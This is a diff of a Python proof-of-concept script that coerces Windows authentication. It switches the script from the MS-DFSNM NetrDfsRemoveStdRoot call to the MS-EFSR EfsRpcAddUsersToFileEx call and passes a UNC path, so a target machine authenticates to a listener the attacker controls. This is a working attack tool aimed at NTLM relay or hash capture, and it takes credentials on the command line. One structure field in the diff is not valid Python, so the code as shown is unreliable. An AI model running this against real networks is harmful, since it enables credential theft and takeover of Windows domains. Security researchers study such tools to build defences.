@@ -2,12 +2,11 @@
 # -*- coding: utf-8 -*-
 # File name          : coerce_poc.py
 # Author             : Podalirius (@podalirius_)
-# Date created       : 22 Jun 2022
+# Date created       : 01 July 2022
 
 
 import sys
 import argparse
-import random
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
@@ -30,24 +29,17 @@ class DCERPCSessionError(DCERPCException):
             return 'SessionError: unknown error code: 0x%x' % self.error_code
 
 
-def gen_random_name(length=8):
-    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    name = ""
-    for k in range(length):
-        name += random.choice(alphabet)
-    return name
-
-
-class NetrDfsRemoveStdRoot(NDRCALL):
-    opnum = 13
+class EfsRpcAddUsersToFileEx(NDRCALL):
+    opnum = 15
     structure = (
-        ('ServerName', WSTR),  # Type: WCHAR *
-        ('RootShare', WSTR),   # Type: WCHAR *
-        ('ApiFlags', DWORD)    # Type: DWORD
+        ('dwFlags', DWORD), # Type: DWORD
+        ('Reserved', DWORD), # Type: EFS_RPC_BLOB *
+        ('FileName', WSTR), # Type: wchar_t *
+        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST *), # Type: ENCRYPTION_CERTIFICATE_LIST *
     )
 
 
-class NetrDfsRemoveStdRootResponse(NDRCALL):
+class EfsRpcAddUsersToFileExResponse(NDRCALL):
     structure = ()
 
 
@@ -86,6 +78,8 @@ class RPCProtocol(object):
             self.__rpctransport.setRemoteHost(targetIp)
 
         self.dce = self.__rpctransport.get_dce_rpc()
+        self.dce.set_auth_type(RPC_C_AUTHN_WINNT)
+        self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
 
         print("[>] Connecting to %s ... " % self.ncan_target, end="")
         sys.stdout.flush()
@@ -112,19 +106,20 @@ class RPCProtocol(object):
         return True
 
 
-class MS_DFSNM(RPCProtocol):
-    uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
-    version = "3.0"
-    pipe = r"\PIPE\netdfs"
+class MS_EFSR(RPCProtocol):
+    uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
+    version = "1.0"
+    pipe = r"\pipe\efsrpc"
 
-    def NetrDfsRemoveStdRoot(self, listener):
+    def EfsRpcAddUsersToFileEx(self, listener):
         if self.dce is not None:
-            print("[>] Calling NetrDfsRemoveStdRoot() ...")
+            print("[>] Calling EfsRpcAddUsersToFileEx() ...")
             try:
-                request = NetrDfsRemoveStdRoot()
-                request['ServerName'] = '%s\x00' % listener
-                request['RootShare'] = gen_random_name() + '\x00'
-                request['ApiFlags'] = 1
+                request = EfsRpcAddUsersToFileEx()
+                request['dwFlags'] = 0
+                request['Reserved'] = 0
+                request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                request['EncryptionCertificates'] = 0
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
@@ -134,8 +129,8 @@ class MS_DFSNM(RPCProtocol):
 
 
 if __name__ == '__main__':
-    print("Windows auth coerce using MS-DFSNM::NetrDfsRemoveStdRoot()\n")
-    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-DFSNM::NetrDfsRemoveStdRoot()")
+    print("Windows auth coerce using MS-EFSR::EfsRpcAddUsersToFileEx()\n")
+    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-EFSR::EfsRpcAddUsersToFileEx()")
 
     parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
     parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
@@ -161,7 +156,7 @@ if __name__ == '__main__':
 
         options.password = getpass("Password:")
 
-    protocol = MS_DFSNM()
+    protocol = MS_EFSR()
 
     connected = protocol.connect(
         username=options.username,
@@ -176,6 +171,6 @@ if __name__ == '__main__':
     )
 
     if connected:
-        protocol.NetrDfsRemoveStdRoot(options.listener)
+        protocol.EfsRpcAddUsersToFileEx(options.listener)
 
     sys.exit()
